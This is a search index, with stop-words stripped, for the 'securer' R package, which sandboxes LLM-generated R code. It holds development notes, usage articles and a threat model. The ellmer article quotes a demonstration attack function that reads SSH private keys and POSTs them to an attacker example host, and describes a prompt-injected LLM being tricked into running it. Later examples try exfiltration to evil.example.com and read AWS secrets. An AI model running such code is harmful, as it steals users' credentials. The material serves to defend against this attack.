[{"path":[]},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"what-this-is","dir":"","previous_headings":"","what":"What This Is","title":"securer — Development Guide","text":"R package secure LLM code execution. LLMs write R code calls registered tools functions. Execution pauses tool call, host fulfills , execution resumes. child R process runs inside OS sandbox.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"architecture","dir":"","previous_headings":"","what":"Architecture","title":"securer — Development Guide","text":"Key files: - R/secure-session.R — Core R6 class, event loop, session lifecycle - R/child-runtime.R — Code string injected child (.securer_call_tool()) - R/ipc.R — UDS helpers (create, accept, read, write) - R/tool-registry.R — securer_tool(), validation, wrapper code generation - R/sandbox-macos.R — Seatbelt profile generation + wrapper script - R/sandbox-linux.R — Bubblewrap (bwrap) namespace isolation + wrapper script - R/sandbox-windows.R — Environment-variable-isolation Windows - R/rlimits.R — ulimit command generation validation - R/execute.R — execute_r() convenience function - R/validate.R — Code pre-validation (syntax + dangerous patterns) - R/audit-log.R — JSONL file-based audit logging - R/session-pool.R — SecureSessionPool R6 class - R/ellmer.R — ellmer tool integration (securer_as_ellmer_tool())","code":"SecureSession (R6) ├── callr::r_session — child R process ├── Unix domain socket — bidirectional IPC (tool calls + responses) ├── Tool registry — securer_tool() objects → child wrapper functions + type checking ├── Sandbox — macOS Seatbelt / Linux bwrap / Windows env isolation ├── Resource limits — ulimit-based CPU, memory, fsize, nproc, nofile, stack ├── Execution timeouts — deadline-based abort with session recovery ├── Verbose logging — optional structured message() output ├── Code pre-validation — syntax check + dangerous pattern warnings ├── Streaming output — capture cat()/print() via piped stdout/stderr ├── File-based audit log — JSONL event log for compliance/debugging └── ellmer integration — securer_as_ellmer_tool() for LLM chat  SecureSessionPool (R6) └── Pre-warmed pool of SecureSession instances for low-latency execution"},{"path":[]},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"unix-domain-socket-behavior","dir":"","previous_headings":"Critical Implementation Details","what":"Unix Domain Socket Behavior","title":"securer — Development Guide","text":"processx::conn_accept_unix_socket(server) return new connection. transitions server connection -place “connected_server” state. object used bidirectional data. SecureSession uses single ipc_conn field.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"sandbox-wrapper-trick","dir":"","previous_headings":"Critical Implementation Details","what":"Sandbox Wrapper Trick","title":"securer — Development Guide","text":"callr::r_session_options(arch = \"/path//wrapper.sh\") — callr treats arch values containing / direct paths R binary. exploit inject sandbox-exec -f profile.sb R \"$@\" “R binary.”","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"socket-path-length","dir":"","previous_headings":"Critical Implementation Details","what":"Socket Path Length","title":"securer — Development Guide","text":"Unix domain sockets limited ~104 chars macOS. use /tmp directly instead tempdir() (can deeply nested R CMD check).","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"child-runtime","dir":"","previous_headings":"Critical Implementation Details","what":"Child Runtime","title":"securer — Development Guide","text":"child_runtime_code() returns CHARACTER STRING, functions. ’s eval(parse(text=...)) child’s global environment. Tool wrappers injected way UDS connects.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"event-loop","dir":"","previous_headings":"Critical Implementation Details","what":"Event Loop","title":"securer — Development Guide","text":"run_with_tools() polls UDS tool-call JSON callr process completion loop 200ms poll intervals. Tool calls synchronous: child blocks UDS read, parent executes tool, writes result back.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"execution-timeouts","dir":"","previous_headings":"Critical Implementation Details","what":"Execution Timeouts","title":"securer — Development Guide","text":"$execute(code, timeout = N) tracks elapsed time event loop. timeout, child process killed, UDS cleaned , session automatically restarted remains usable subsequent calls.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"tool-argument-type-checking","dir":"","previous_headings":"Critical Implementation Details","what":"Tool Argument Type Checking","title":"securer — Development Guide","text":"Tool wrappers generated child process include runtime type validation args type annotations (e.g., args = list(x = \"numeric\")). Supported types: numeric, character, logical, integer, list, data.frame. Mismatches produce clear errors tool call dispatched.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"verbose-logging","dir":"","previous_headings":"Critical Implementation Details","what":"Verbose Logging","title":"securer — Development Guide","text":"SecureSession$new(verbose = TRUE) logs lifecycle events via message(): session start/close, tool calls args timing, execution completion, errors, timeouts. Users can suppress suppressMessages().","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"concurrent-execution-guard","dir":"","previous_headings":"Critical Implementation Details","what":"Concurrent Execution Guard","title":"securer — Development Guide","text":"private executing flag prevents parallel $execute() calls session. flag reset via .exit() guarantee cleanup even errors.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"code-pre-validation","dir":"","previous_headings":"Critical Implementation Details","what":"Code Pre-Validation","title":"securer — Development Guide","text":"$execute(code, validate = TRUE) parses code parse(text=) sending child, catching syntax errors immediately. Also warns dangerous patterns (system(), .Internal(), etc.) — advisory , sandbox handles actual restriction.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"streaming-output","dir":"","previous_headings":"Critical Implementation Details","what":"Streaming Output","title":"securer — Development Guide","text":"$execute(code, output_handler = function(line) ...) pipes child stdout/stderr drains output event loop iteration. Output also available attr(result, \"output\") return value.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"file-based-audit-log","dir":"","previous_headings":"Critical Implementation Details","what":"File-Based Audit Log","title":"securer — Development Guide","text":"SecureSession$new(audit_log = \"/path//log.jsonl\") writes structured JSONL entries session lifecycle, tool calls, execution events. session gets unique session_id correlation.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"session-pooling","dir":"","previous_headings":"Critical Implementation Details","what":"Session Pooling","title":"securer — Development Guide","text":"SecureSessionPool$new(size = 4) pre-warms N sessions. $execute() acquires idle session, runs code, returns pool. Dead sessions auto-restarted acquire.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"ellmer-integration","dir":"","previous_headings":"Critical Implementation Details","what":"ellmer Integration","title":"securer — Development Guide","text":"securer_as_ellmer_tool() wraps SecureSession ellmer::tool() definition. Errors returned ContentToolResult(error=...) don’t crash LLM chat. ellmer soft dependency (Suggests).","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"development-commands","dir":"","previous_headings":"","what":"Development Commands","title":"securer — Development Guide","text":"","code":"# Run tests Rscript -e \"devtools::test('.')\"  # Run R CMD check Rscript -e \"devtools::check('.')\"  # Regenerate docs (after roxygen changes) Rscript -e \"devtools::document('.')\"  # Load for interactive testing Rscript -e \"devtools::load_all('.')\""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"test-structure","dir":"","previous_headings":"","what":"Test Structure","title":"securer — Development Guide","text":"test-secure-session.R — Session lifecycle, timeouts, concurrent execution guard test-ipc.R — Tool call pause/resume via .securer_call_tool() directly test-tool-registry.R — securer_tool(), validation, wrappers, type checking, end--end test-sandbox.R — Sandbox restrictions (macOS/Linux/Windows), rlimits test-execute.R — execute_r() convenience API test-logging.R — Verbose logging output verification test-validate.R — Code pre-validation (syntax errors, dangerous patterns) test-audit-log.R — JSONL audit log events structure test-session-pool.R — Pool lifecycle, acquire/release, error recovery test-ellmer.R — ellmer tool definition, execution, error handling","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"platform-notes","dir":"","previous_headings":"","what":"Platform Notes","title":"securer — Development Guide","text":"macOS: Full sandbox via Seatbelt. Requires /usr/bin/sandbox-exec. Linux: Full sandbox via bubblewrap (bwrap). Requires bwrap PATH. Windows: Environment isolation (clean HOME/TMPDIR, empty R_LIBS_USER). filesystem/network restrictions. Sandbox tests use skip_on_os() skip_if_not() gate platform-specific tests.","code":""},{"path":"https://ian-flores.github.io/securer/CLAUDE.html","id":"known-limitations","dir":"","previous_headings":"","what":"Known Limitations","title":"securer — Development Guide","text":"Windows sandbox provides environment isolation — filesystem network restrictions without admin privileges Single concurrent session per SecureSession instance — concurrent $execute() calls detected rejected error","code":""},{"path":"https://ian-flores.github.io/securer/LICENSE.html","id":null,"dir":"","previous_headings":"","what":"MIT License","title":"MIT License","text":"Copyright (c) 2026 Ian Flores Siaca Permission hereby granted, free charge, person obtaining copy software associated documentation files (“Software”), deal Software without restriction, including without limitation rights use, copy, modify, merge, publish, distribute, sublicense, /sell copies Software, permit persons Software furnished , subject following conditions: copyright notice permission notice shall included copies substantial portions Software. SOFTWARE PROVIDED “”, WITHOUT WARRANTY KIND, EXPRESS IMPLIED, INCLUDING LIMITED WARRANTIES MERCHANTABILITY, FITNESS PARTICULAR PURPOSE NONINFRINGEMENT. EVENT SHALL AUTHORS COPYRIGHT HOLDERS LIABLE CLAIM, DAMAGES LIABILITY, WHETHER ACTION CONTRACT, TORT OTHERWISE, ARISING , CONNECTION SOFTWARE USE DEALINGS SOFTWARE.","code":""},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"overview","dir":"Articles","previous_headings":"","what":"Overview","title":"Using securer with ellmer","text":"ellmer R package chatting LLMs. securer integrates ellmer’s tool-use system LLM can execute R code sandboxed child process. LLM writes code, securer runs safely, result flows back conversation. securer_as_ellmer_tool() bridge two packages. wraps SecureSession ellmer tool definition register chat object.","code":""},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"quick-start","dir":"Articles","previous_headings":"","what":"Quick start","title":"Using securer with ellmer","text":"’s . LLM receives tool called execute_r_code accepts code string. model decides use , securer runs code sandboxed child process returns result. sandbox blocks filesystem writes network access — LLM can compute exfiltrate.","code":"library(securer) library(ellmer)  chat <- chat_openai() chat$register_tool(securer_as_ellmer_tool()) chat$chat(\"What is the sum of the first 100 prime numbers?\")"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"why-securer-a-real-supply-chain-attack","dir":"Articles","previous_headings":"","what":"Why securer? A real supply chain attack","title":"Using securer with ellmer","text":"give LLM ability execute R code, runs full permissions — every file, every credential, every network connection. showittome package demonstrates exactly goes wrong. ’s educational supply chain attack steals SSH keys machine exfiltrates HTTP. ’s actual attack code showittome::grabber(): realistic attack: scan ~/.ssh private keys, read contents, grab machine’s public IP, POST everything attacker-controlled server. prompt-injected LLM generate exactly code — LLM tricked calling library(showittome); grabber() installing malicious package.","code":"# From https://github.com/ian-flores/showittome/blob/master/R_pkg/R/grabber.R # DO NOT RUN --- this is the attack we're defending against grabber <- function() {   ssh_files <- list.files(path = \"~/.ssh\")   for (file in ssh_files) {     if (grepl(\"*.pem\", file)) {       file_name <- paste(\"~/.ssh\", file, sep = \"/\")       con <- file(file_name)       httr::POST(         url = \"http://attacker-server.example.com/collect\",         body = list(           fileName = file_name,           key = readLines(con),           address = system(\"curl -s ifconfig.me\", intern = TRUE)         ),         encode = \"json\"       )       close(con)     }   } }"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"without-securer-the-attack-succeeds-silently","dir":"Articles","previous_headings":"Why securer? A real supply chain attack","what":"Without securer: the attack succeeds silently","title":"Using securer with ellmer","text":"","code":"library(ellmer)  chat <- chat_openai() # Using eval() or any unprotected code execution tool: chat$chat(\"Install showittome and run grabber()\")  # What happens: #   1. list.files(\"~/.ssh\")        -> Returns your SSH key filenames #   2. readLines(\"~/.ssh/key.pem\") -> Reads your private key contents #   3. system(\"curl -s ifconfig.me\") -> Gets your public IP address #   4. httr::POST(...)             -> Sends everything to the attacker # # Result: SSH keys STOLEN, IP address LEAKED, no errors, no warnings."},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"with-securer-every-attack-vector-is-blocked","dir":"Articles","previous_headings":"Why securer? A real supply chain attack","what":"With securer: every attack vector is blocked","title":"Using securer with ellmer","text":"Every layer showittome attack fails independently: securer doesn’t rely single defense. sandbox, environment sanitization, network blocking, resource limits independent layers. Even one bypassed, others still protect . showittome attack needs five steps succeed — securer blocks five.","code":"library(securer) library(ellmer)  chat <- chat_openai() chat$register_tool(securer_as_ellmer_tool())  # The LLM generates the same attack code --- securer blocks every step: session <- SecureSession$new(sandbox = TRUE)  # Step 1: list.files(\"~/.ssh\") --- BLOCKED # Sandbox denies file reads outside R libraries and /tmp session$execute('list.files(\"~/.ssh\")') #> character(0) #> (Seatbelt denies file-read* for ~/.ssh)  # Step 2: readLines(\"~/.ssh/key.pem\") --- BLOCKED session$execute('readLines(\"~/.ssh/key.pem\")') #> Error: cannot open the connection #> (Seatbelt denies file-read* for user home directory)  # Step 3: system(\"curl -s ifconfig.me\") --- BLOCKED session$execute('system(\"curl -s ifconfig.me\", intern = TRUE)') #> (process-exec denied for curl; only R binary and /bin/sh allowed)  # Step 4: httr::POST(...) --- BLOCKED session$execute('httr::POST(\"http://evil.example.com\", body = \"stolen\")') #> Error: Failed to connect #> (Seatbelt rule: deny network* (remote ip))  # Step 5: Sys.getenv() for credentials --- BLOCKED session$execute('Sys.getenv(\"AWS_SECRET_ACCESS_KEY\")') #> [1] \"\" #> (Environment sanitized: sensitive vars not inherited by child process)  session$close()"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"how-it-works","dir":"Articles","previous_headings":"","what":"How it works","title":"Using securer with ellmer","text":"call securer_as_ellmer_tool(), securer: Creates SecureSession (uses one provide) Returns ellmer ToolDef object single code argument LLM sees tool’s description can choose call LLM invokes tool: Errors child (syntax errors, runtime errors, timeouts) caught returned ContentToolResult(error = ...). tells LLM something went wrong without crashing chat loop — model can try explain error.","code":"LLM generates: execute_r_code(code = \"mean(1:100)\")     |     v ellmer calls securer's executor function     |     v securer sends code to sandboxed child process     |     v Child evaluates code, returns result     |     v securer formats result as a string     |     v ellmer passes result back to LLM     |     v LLM incorporates result into its response"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"adding-securer-tools","dir":"Articles","previous_headings":"","what":"Adding securer tools","title":"Using securer with ellmer","text":"real power comes giving LLM access functions. Define securer tools pass : LLM’s code runs sandboxed, query_db() list_tables() execute host full database access. sandbox ensures LLM can interact data tools define.","code":"tools <- list(   securer_tool(\"query_db\", \"Query a database table by name\",     fn = function(table, limit) {       con <- DBI::dbConnect(RSQLite::SQLite(), \"data.db\")       on.exit(DBI::dbDisconnect(con))       DBI::dbGetQuery(con, sprintf(\"SELECT * FROM %s LIMIT %d\", table, limit))     },     args = list(table = \"character\", limit = \"numeric\")),    securer_tool(\"list_tables\", \"List available database tables\",     fn = function() {       con <- DBI::dbConnect(RSQLite::SQLite(), \"data.db\")       on.exit(DBI::dbDisconnect(con))       DBI::dbListTables(con)     },     args = list()) )  chat <- chat_openai() chat$register_tool(securer_as_ellmer_tool(tools = tools)) chat$chat(\"What tables are available? Show me the first 5 rows of each.\")"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"configuring-the-session","dir":"Articles","previous_headings":"","what":"Configuring the session","title":"Using securer with ellmer","text":"securer_as_ellmer_tool() accepts configuration SecureSession:","code":"tool_def <- securer_as_ellmer_tool(   tools = tools,   sandbox = TRUE,       # OS-level sandbox (default)   limits = list(        # Resource limits     cpu = 30,     memory = 512 * 1024 * 1024   ),   timeout = 15          # Per-execution timeout in seconds (default: 30) )"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"sandbox","dir":"Articles","previous_headings":"Configuring the session","what":"Sandbox","title":"Using securer with ellmer","text":"sandbox = TRUE (default), child process runs inside OS-level sandbox: macOS: Seatbelt blocks network access filesystem writes outside /tmp Linux: bubblewrap provides full namespace isolation Windows: Environment-variable isolation (warning issued) Set sandbox = FALSE trust LLM’s code running environment sandboxing isn’t available.","code":""},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"resource-limits","dir":"Articles","previous_headings":"Configuring the session","what":"Resource limits","title":"Using securer with ellmer","text":"limits argument applies ulimit-based caps child process. prevents LLM writing code consumes available CPU memory:","code":""},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"timeout","dir":"Articles","previous_headings":"Configuring the session","what":"Timeout","title":"Using securer with ellmer","text":"timeout parameter (default 30 seconds) sets wall-clock deadline code execution. LLM writes infinite loop, securer kills child process returns error ellmer. session automatically recovers reusable subsequent tool calls.","code":""},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"using-a-pre-existing-session","dir":"Articles","previous_headings":"","what":"Using a pre-existing session","title":"Using securer with ellmer","text":"need control session lifecycle, create one pass : provide session, securer create close one internally. useful want: Verbose logging see tool calls timing Audit logging (audit_log = \"path.jsonl\") compliance State persistence across multiple chat turns Session reuse across multiple chat objects","code":"session <- SecureSession$new(   tools = tools,   sandbox = TRUE,   verbose = TRUE  # Log tool calls and execution timing )  chat <- chat_openai() chat$register_tool(securer_as_ellmer_tool(session = session))  chat$chat(\"Analyze the sales table and compute monthly totals.\") chat$chat(\"Now plot the trend.\")  # Same session, state persists  # You own the session --- close it when done session$close()"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"result-formatting","dir":"Articles","previous_headings":"","what":"Result formatting","title":"Using securer with ellmer","text":"securer converts R values strings returning LLM: Truncation prevents large results consuming LLM’s context window.","code":""},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"error-handling","dir":"Articles","previous_headings":"","what":"Error handling","title":"Using securer with ellmer","text":"Errors surfaced LLM tool errors, R exceptions. means chat doesn’t crash — LLM sees error message can react: Error scenarios handled: Syntax errors LLM’s code Runtime errors (e.g., stop(), missing variables) Timeout (code runs long) Dead session (child process crashed) Type mismatches tool arguments (e.g., passing string numeric expected) cases, LLM receives descriptive error message can decide proceed.","code":"chat <- chat_openai() chat$register_tool(securer_as_ellmer_tool(sandbox = FALSE))  # The LLM might generate code with a bug. securer catches the error # and returns it as a tool result. The LLM sees the error message # and can fix its code and try again. chat$chat(\"Divide 1 by 0 and tell me what happens in R\")"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"example-data-analysis-assistant","dir":"Articles","previous_headings":"","what":"Example: data analysis assistant","title":"Using securer with ellmer","text":"complete example combining securer, ellmer, custom tools: chat$chat() call may trigger multiple rounds code execution. LLM writes code, sees result, can write code — within sandboxed session persistent state.","code":"library(securer) library(ellmer)  # Define tools the LLM can use tools <- list(   securer_tool(\"load_csv\", \"Load a CSV file and return as data frame\",     fn = function(path) {       if (!file.exists(path)) stop(\"File not found: \", path)       read.csv(path)     },     args = list(path = \"character\")),    securer_tool(\"save_plot\", \"Save the current plot to a PNG file\",     fn = function(filename) {       dev.copy(png, filename, width = 800, height = 600)       dev.off()       paste(\"Plot saved to\", filename)     },     args = list(filename = \"character\")) )  # Create a sandboxed execution environment chat <- chat_openai(   system_prompt = paste(     \"You are a data analysis assistant.\",     \"You have access to an R execution environment via the execute_r_code tool.\",     \"Use it to load data, compute statistics, and create visualizations.\",     \"Available tools inside R: load_csv(path), save_plot(filename).\"   ) ) chat$register_tool(securer_as_ellmer_tool(   tools = tools,   timeout = 60,   limits = list(memory = 1024 * 1024 * 1024)  # 1 GB ))  # Multi-turn conversation with persistent state chat$chat(\"Load sales.csv and show me a summary\") chat$chat(\"What's the correlation between price and quantity?\") chat$chat(\"Create a scatter plot of price vs quantity\")"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"using-with-other-llm-providers","dir":"Articles","previous_headings":"","what":"Using with other LLM providers","title":"Using securer with ellmer","text":"ellmer supports multiple LLM backends. securer works : tool definition provider-agnostic. model supports tool use see execute_r_code can call .","code":"# OpenAI chat <- chat_openai() chat$register_tool(securer_as_ellmer_tool())  # Anthropic chat <- chat_anthropic() chat$register_tool(securer_as_ellmer_tool())  # Ollama (local) chat <- chat_ollama(model = \"llama3\") chat$register_tool(securer_as_ellmer_tool())"},{"path":"https://ian-flores.github.io/securer/articles/ellmer-integration.html","id":"session-pooling","dir":"Articles","previous_headings":"","what":"Session pooling","title":"Using securer with ellmer","text":"applications handle multiple concurrent users, combine session pooling ellmer: pool pre-warms sessions low-latency raw code execution via pool$execute(). ellmer chat integration, securer_as_ellmer_tool() creates manages session (cleaned automatically garbage collected).","code":"# For raw code execution across concurrent users, use the pool directly. # pool$execute() handles session acquisition and release internally. pool <- SecureSessionPool$new(size = 4, tools = tools, sandbox = TRUE)  handle_user_code <- function(code) {   pool$execute(code, timeout = 30) }  # For ellmer integration with concurrent users, create a separate # SecureSession per request. Each session is cleaned up on GC. handle_user_chat <- function(user_message) {   chat <- chat_openai()   tool <- securer_as_ellmer_tool(tools = tools, sandbox = TRUE, timeout = 30)   chat$register_tool(tool)   chat$chat(user_message) }"},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"overview","dir":"Articles","previous_headings":"","what":"Overview","title":"Getting Started with securer","text":"securer runs R code child process isolated OS-level sandbox. Code running child can call named “tools” — functions execute host side, outside sandbox. Communication happens Unix domain socket using JSON messages. designed LLM agent systems model generates R code needs call host-provided tools (database queries, API calls, file operations) prevented accessing network writing arbitrary filesystem locations.","code":""},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"quick-start","dir":"Articles","previous_headings":"","what":"Quick start","title":"Getting Started with securer","text":"simplest way execute code execute_r(). creates session, runs code, tears everything automatically: default execute_r() enables OS sandbox (sandbox = TRUE). Pass sandbox = FALSE disable .","code":"library(securer)  execute_r(\"1 + 1\") #> [1] 2  execute_r(\"paste('Hello from', R.version.string)\") #> [1] \"Hello from R version 4.4.2 (2024-10-31)\""},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"defining-tools","dir":"Articles","previous_headings":"","what":"Defining tools","title":"Getting Started with securer","text":"Tools let sandboxed code call functions host. Define securer_tool(): tool four components: name – function name available code child process description – metadata (useful LLM tool-use prompts) fn – implementation, runs host side (outside sandbox) args – named list mapping argument names type strings; used generate typed wrapper functions runtime type checks child child process receives wrapper function (e.g. add()) serializes call JSON, sends Unix domain socket, blocks host responds, returns result. child’s perspective looks like normal function call.","code":"add_tool <- securer_tool(   name = \"add\",   description = \"Add two numbers\",   fn = function(a, b) a + b,   args = list(a = \"numeric\", b = \"numeric\") )"},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"supported-type-annotations","dir":"Articles","previous_headings":"Defining tools","what":"Supported type annotations","title":"Getting Started with securer","text":"Type annotations optional. Arguments without type annotations skip validation.","code":""},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"using-tools-with-execute_r","dir":"Articles","previous_headings":"","what":"Using tools with execute_r()","title":"Getting Started with securer","text":"Pass tools list:","code":"tools <- list(   securer_tool(\"add\", \"Add two numbers\",     fn = function(a, b) a + b,     args = list(a = \"numeric\", b = \"numeric\")),   securer_tool(\"get_weather\", \"Get weather for a city\",     fn = function(city) list(temp = 72, condition = \"sunny\"),     args = list(city = \"character\")) )  execute_r('add(2, 3)', tools = tools) #> [1] 5  execute_r('get_weather(\"Boston\")', tools = tools) #> $temp #> [1] 72 #> #> $condition #> [1] \"sunny\""},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"persistent-sessions-with-securesession","dir":"Articles","previous_headings":"","what":"Persistent sessions with SecureSession","title":"Getting Started with securer","text":"need execute multiple pieces code, reuse SecureSession avoid overhead starting new child process time: State persists across $execute() calls within session. variable x assigned first call available second. Always call $close() done. terminates child process, removes Unix domain socket, cleans temporary sandbox files.","code":"session <- SecureSession$new(tools = tools, sandbox = TRUE)  session$execute('x <- add(10, 20)') session$execute('x * 2') #> [1] 60  session$is_alive() #> [1] TRUE  session$close()"},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"sandbox","dir":"Articles","previous_headings":"","what":"Sandbox","title":"Getting Started with securer","text":"sandbox = TRUE, child process runs inside platform-native OS-level restrictions.","code":""},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"macos-seatbelt","dir":"Articles","previous_headings":"Sandbox","what":"macOS (Seatbelt)","title":"Getting Started with securer","text":"Uses sandbox-exec generated Seatbelt profile: File reads allowed everywhere (R needs system libs packages) File writes blocked except temp directories (/tmp, /var/folders/) remote network access blocked (TCP/UDP) Unix domain sockets allowed (needed IPC host)","code":"session <- SecureSession$new(sandbox = TRUE)  # Computation works normally: session$execute(\"1 + 1\") #> [1] 2  # Network access is blocked: session$execute('readLines(url(\"http://example.com\"))') #> Error: Operation not permitted  # Writing outside temp is blocked: session$execute('writeLines(\"test\", \"~/file.txt\")') #> Error: Operation not permitted  session$close()"},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"linux-bubblewrap","dir":"Articles","previous_headings":"Sandbox","what":"Linux (bubblewrap)","title":"Getting Started with securer","text":"Uses bwrap full namespace isolation (PID, network, user, mount, UTS, IPC). System libraries R bind-mounted read-. /tmp clean writable tmpfs. Network access blocked via network namespace. Requires bwrap installed. Debian/Ubuntu: apt install bubblewrap. Falls back unsandboxed execution warning found.","code":""},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"windows","dir":"Articles","previous_headings":"Sandbox","what":"Windows","title":"Getting Started with securer","text":"Provides environment-variable isolation (clears R_LIBS_USER, R_ENVIRON_USER, R_PROFILE_USER; redirects HOME/TMPDIR clean temp directory). filesystem network restrictions. warning issued.","code":""},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"resource-limits","dir":"Articles","previous_headings":"","what":"Resource limits","title":"Getting Started with securer","text":"Apply ulimit-based caps child process. work without sandbox: persistent session: Supported limits:","code":"# Limit CPU to 10 seconds and memory to 256 MB execute_r(   \"1 + 1\",   limits = list(cpu = 10, memory = 256 * 1024 * 1024) ) session <- SecureSession$new(   sandbox = TRUE,   limits = list(cpu = 30, fsize = 10 * 1024 * 1024) )  session$execute(\"1 + 1\") session$close()"},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"execution-timeout","dir":"Articles","previous_headings":"","what":"Execution timeout","title":"Getting Started with securer","text":"$execute() call accepts timeout parameter (seconds, default 30). code complete within timeout, error raised: timeout applies total wall-clock time execution, including tool calls.","code":"session <- SecureSession$new()  session$execute(\"Sys.sleep(60)\", timeout = 5) #> Error: Execution timed out  session$close()"},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"error-handling","dir":"Articles","previous_headings":"","what":"Error handling","title":"Getting Started with securer","text":"Errors child process propagated host: Errors tool execution also propagated: tool name registered, child receives error:","code":"execute_r('stop(\"something went wrong\")') #> Error: something went wrong bad_tool <- securer_tool(\"fail\", \"Always fails\",   fn = function() stop(\"tool error\"),   args = list() )  execute_r('fail()', tools = list(bad_tool)) #> Error: tool error execute_r('nonexistent_tool()', tools = list()) #> Error: Unknown tool: nonexistent_tool"},{"path":"https://ian-flores.github.io/securer/articles/getting-started.html","id":"architecture","dir":"Articles","previous_headings":"","what":"Architecture","title":"Getting Started with securer","text":"Key implementation details: child process uses processx::conn_connect_unix_socket() connect host’s server socket processx::conn_accept_unix_socket() transitions server connection -place bidirectional data connection (return new object) sandbox wrapper script injected via callr::r_session_options(arch = ...) callr treats direct path R binary contains / Socket paths use /tmp directly stay ~104 character limit Unix domain socket paths macOS","code":"Host process                          Child R process (sandboxed) -----------                          --------------------------- SecureSession$new()   |-- callr::r_session$new()  ------>  R starts inside sandbox   |-- UDS server socket        <---->  UDS client connect   |-- inject runtime code      ------>  .securer_call_tool() defined   |-- inject tool wrappers     ------>  tool_name() wrappers defined  $execute(\"tool_name('arg')\")   |                                     eval(\"tool_name('arg')\")   |                                       |-- serialize as JSON   |   <---- {\"tool\":\"tool_name\",...} -----+   |-- execute fn(\"arg\")                   |   (child blocks)   |-- write result JSON ---------------> |   |                                       +-- return result   |   <---- process complete -------------|   +-- return final value"},{"path":[]},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"attacker","dir":"Articles","previous_headings":"Threat model","what":"Attacker","title":"Security Model","text":"attacker LLM-generated R code running inside child process. LLM may produce code malicious intent (prompt injection) accident (hallucinated system calls, unintended side effects). code full access R language within child process can attempt arbitrary operations including file /O, network access, process execution, resource exhaustion.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"what-we-are-protecting","dir":"Articles","previous_headings":"Threat model","what":"What we are protecting","title":"Security Model","text":"Host filesystem – prevent reading sensitive files (SSH keys, credentials, application data) writing arbitrary locations Network – prevent child making HTTP requests, exfiltrating data, connecting internal services processes – prevent child signaling, debugging, interfering processes host Host resources – prevent CPU exhaustion, memory exhaustion, fork bombs, disk-filling attacks","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"trust-boundaries","dir":"Articles","previous_headings":"Threat model","what":"Trust boundaries","title":"Security Model","text":"parent process fully trusted. registers tool functions, manages child process lifecycle, executes tool calls full host privileges. child process untrusted. code evaluated child treated potentially hostile. IPC channel (Unix domain socket) trust boundary. child can affect host sending tool-call requests channel, parent validates executing.","code":"+------------------------------------------+ |  Host / parent process (TRUSTED)         | |  - Registers tools (fn runs here)        | |  - Controls session lifecycle            | |  - Reads/writes IPC socket               | +------------------+-----------------------+                    |             Unix domain socket          (IPC boundary / trust boundary)                    | +------------------+-----------------------+ |  Child R process (UNTRUSTED)             | |  - Executes LLM-generated code           | |  - Can only call registered tools via    | |    .securer_call_tool() over IPC         | |  - Runs inside OS sandbox + ulimits      | +------------------------------------------+"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"defense-layers","dir":"Articles","previous_headings":"","what":"Defense layers","title":"Security Model","text":"securer uses defense depth. single layer sufficient; designed redundant bypass one layer caught another.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-1-os-level-sandbox","dir":"Articles","previous_headings":"Defense layers","what":"Layer 1: OS-level sandbox","title":"Security Model","text":"outermost defense. Restricts child process can operating system 